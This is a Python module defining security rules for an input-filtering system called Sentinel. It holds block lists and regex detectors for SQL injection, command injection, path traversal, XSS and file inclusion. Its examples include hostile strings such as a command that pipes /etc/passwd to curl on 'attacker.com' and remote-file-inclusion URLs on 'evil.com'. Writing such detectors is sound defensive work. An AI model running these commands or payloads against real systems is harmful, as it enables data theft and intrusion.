"""
VAEL Core - Sentinel Security Rules
===================================

This module contains security rules, patterns, and management functions
for the Sentinel security system. It provides a comprehensive set of
default security rules and the infrastructure to manage custom rules.

Usage:
    from sentinel.rules import (
        get_default_patterns, get_default_blocked_terms,
        check_message_against_rules, Rule, Severity
    )
"""

import re
import json
import os
import logging
from enum import Enum
from typing import Dict, List, Set, Tuple, Optional, Pattern, Any, Union
from dataclasses import dataclass, field, asdict
from datetime import datetime

# Configure logger
logger = logging.getLogger(__name__)

class Severity(Enum):
    """Severity levels for security rules."""
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    CRITICAL = 4
    
    def __str__(self) -> str:
        return self.name
    
    @classmethod
    def from_string(cls, value: str) -> 'Severity':
        """Convert string to Severity enum."""
        try:
            return cls[value.upper()]
        except KeyError:
            logger.warning(f"Invalid severity: {value}, defaulting to MEDIUM")
            return cls.MEDIUM

@dataclass
class Rule:
    """Security rule definition."""
    id: str
    name: str
    pattern: Union[str, Pattern]
    severity: Severity
    description: str
    examples: List[str] = field(default_factory=list)
    enabled: bool = True
    created: datetime = field(default_factory=datetime.now)
    modified: datetime = field(default_factory=datetime.now)
    
    def __post_init__(self):
        """Compile pattern if it's a string."""
        if isinstance(self.pattern, str):
            try:
                self.pattern = re.compile(self.pattern, re.IGNORECASE)
            except re.error as e:
                logger.error(f"Invalid regex pattern in rule {self.id}: {e}")
                # Create a pattern that won't match anything
                self.pattern = re.compile(r"^\b$")
                self.enabled = False
        
        if isinstance(self.severity, str):
            self.severity = Severity.from_string(self.severity)
    
    def matches(self, text: str) -> bool:
        """Check if the rule matches the given text."""
        if not self.enabled:
            return False
        
        if hasattr(self.pattern, 'search'):
            return bool(self.pattern.search(text))
        return False
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert rule to dictionary for serialization."""
        result = asdict(self)
        result['pattern'] = self.pattern.pattern if hasattr(self.pattern, 'pattern') else str(self.pattern)
        result['severity'] = str(self.severity)
        result['created'] = self.created.isoformat()
        result['modified'] = self.modified.isoformat()
        return result
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'Rule':
        """Create rule from dictionary."""
        # Handle datetime fields
        if 'created' in data and isinstance(data['created'], str):
            data['created'] = datetime.fromisoformat(data['created'])
        if 'modified' in data and isinstance(data['modified'], str):
            data['modified'] = datetime.fromisoformat(data['modified'])
        
        return cls(**data)

# Default blocked terms by category
DEFAULT_BLOCKED_TERMS = {
    # System commands
    "system": {
        "rm -rf", "sudo rm", "format disk", "del /f", "deltree",
        "shutdown", "reboot", "halt", "poweroff", "init 0",
        "taskkill", "killall", "pkill", "kill -9"
    },
    
    # Database attacks
    "database": {
        "drop table", "drop database", "truncate table", 
        "delete from", "update users set password", 
        "1=1", "or 1=1", "' or '1'='1", "admin' --"
    },
    
    # File operations
    "file": {
        "cat /etc/passwd", "cat /etc/shadow", "type C:\\Windows\\win.ini",
        "/proc/self/environ", "../../etc/passwd", "C:\\Windows\\system32"
    },
    
    # Network attacks
    "network": {
        "nmap -sS", "ping -c", "traceroute", "nc -e", "wget http",
        "curl -o", "telnet", "netcat"
    },
    
    # Script injection
    "script": {
        "<script>", "javascript:", "onerror=", "onload=", "eval(",
        "document.cookie", "alert(", "prompt(", "confirm("
    }
}

# Regex patterns for common threats
DEFAULT_PATTERNS = [
    # SQL Injection
    Rule(
        id="SQL-001",
        name="SQL Injection - Basic",
        pattern=r"(?i)(select|insert|update|delete|drop|alter|create)\s+(from|into|table|database)",
        severity=Severity.HIGH,
        description="Basic SQL injection attempt detected",
        examples=["SELECT * FROM users", "DROP TABLE users"]
    ),
    
    # Command Injection
    Rule(
        id="CMD-001",
        name="Command Injection - Basic",
        pattern=r"(?i)(;|\||\|\||&&|\$\(|\`)(ls|cat|rm|chmod|wget|curl)",
        severity=Severity.CRITICAL,
        description="Command injection attempt detected",
        examples=["ls; rm -rf /", "cat /etc/passwd | curl -d @- attacker.com"]
    ),
    
    # Path Traversal
    Rule(
        id="PATH-001",
        name="Path Traversal",
        pattern=r"(?i)(\.\./|\.\./\./|/\.\./|/\.\./\.\.)",
        severity=Severity.HIGH,
        description="Directory traversal attempt detected",
        examples=["../../etc/passwd", "../../../etc/shadow"]
    ),
    
    # XSS Attacks
    Rule(
        id="XSS-001",
        name="Cross-Site Scripting",
        pattern=r"(?i)<script.*?>|javascript:|onerror=|onload=|onclick=",
        severity=Severity.HIGH,
        description="Cross-site scripting attempt detected",
        examples=["<script>alert('XSS')</script>", "javascript:alert(document.cookie)"]
    ),
    
    # Local File Inclusion
    Rule(
        id="LFI-001",
        name="Local File Inclusion",
        pattern=r"(?i)(\?|&)(file|page|include|require|path|directory)=\.\.?/",
        severity=Severity.MEDIUM,
        description="Local file inclusion attempt detected",
        examples=["?file=../../../etc/passwd", "&include=../config.php"]
    ),
    
    # Remote File Inclusion
    Rule(
        id="RFI-001",
        name="Remote File Inclusion",
        pattern=r"(?i)(\?|&)(file|page|include|require|path)=(https?|ftp)://",
        severity=Severity.HIGH,
        description="Remote file inclusion attempt detected",
        examples=["?file=http://evil.com/shell.php", "&include=https://attacker.com/backdoor.php"]
    ),
    
    # Server-Side Template Injection
    Rule(
        id="SSTI-001",
        name="Server-Side Template Injection",
        pattern=r"(?i)\{\{.*?\}\}|\{%.*?%\}|\${.*?}",
        severity=Severity.MEDIUM,
        description="Potential template injection detected",
        examples=["{{7*7}}", "${7*7}", "{% for x in [1,2,3] %}{{ x }}{% endfor %}"]
    )
]

def get_default_patterns() -> List[Rule]:
    """Get the default rule patterns."""
    return DEFAULT_PATTERNS.copy()

def get_default_blocked_terms() -> Set[str]:
    """Get a flattened set of all default blocked terms."""
    result = set()
    for category, terms in DEFAULT_BLOCKED_TERMS.items():
        result.update(terms)
    return result

def get_blocked_terms_by_category(category: Optional[str] = None) -> Dict[str, Set[str]]:
    """
    Get blocked terms, optionally filtered by category.
    
    Args:
        category: Optional category to filter by
        
    Returns:
        Dictionary mapping categories to sets of terms
    """
    if category:
        if category in DEFAULT_BLOCKED_TERMS:
            return {category: DEFAULT_BLOCKED_TERMS[category]}
        return {}
    
    return {k: set(v) for k, v in DEFAULT_BLOCKED_TERMS.items()}

def load_rules_from_file(filepath: str) -> List[Rule]:
    """
    Load rules from a JSON file.
    
    Args:
        filepath: Path to the JSON rules file
        
    Returns:
        List of Rule objects
    """
    if not os.path.exists(filepath):
        logger.warning(f"Rules file not found: {filepath}")
        return []
    
    try:
        with open(filepath, 'r') as f:
            data = json.load(f)
        
        rules = []
        for rule_data in data:
            try:
                rules.append(Rule.from_dict(rule_data))
            except Exception as e:
                logger.error(f"Error loading rule: {e}")
        
        logger.info(f"Loaded {len(rules)} rules from {filepath}")
        return rules
    
    except Exception as e:
        logger.error(f"Error loading rules from {filepath}: {e}")
        return []

def save_rules_to_file(rules: List[Rule], filepath: str) -> bool:
    """
    Save rules to a JSON file.
    
    Args:
        rules: List of Rule objects
        filepath: Path to save the JSON rules file
        
    Returns:
        True if successful, False otherwise
    """
    try:
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        
        # Convert rules to dictionaries
        rules_data = [rule.to_dict() for rule in rules]
        
        with open(filepath, 'w') as f:
            json.dump(rules_data, f, indent=2)
        
        logger.info(f"Saved {len(rules)} rules to {filepath}")
        return True
    
    except Exception as e:
        logger.error(f"Error saving rules to {filepath}: {e}")
        return False

def check_message_against_rules(message: str, rules: List[Rule]) -> List[Tuple[Rule, bool]]:
    """
    Check a message against a list of rules.
    
    Args:
        message: The message to check
        rules: List of Rule objects to check against
        
    Returns:
        List of (rule, matched) tuples
    """
    results = []
    for rule in rules:
        if rule.enabled:
            matched = rule.matches(message)
            if matched:
                logger.warning(f"Rule {rule.id} ({rule.name}) matched: {message[:50]}...")
            results.append((rule, matched))
    
    return results

def check_message_against_terms(message: str, terms: Set[str]) -> Tuple[bool, Optional[str]]:
    """
    Check if a message contains any blocked terms.
    
    Args:
        message: The message to check
        terms: Set of blocked terms
        
    Returns:
        Tuple of (matched, term) where term is the matched term or None
    """
    lower_message = message.lower()
    for term in terms:
        if term.lower() in lower_message:
            logger.warning(f"Blocked term '{term}' found in message: {message[:50]}...")
            return True, term
    
    return False, None
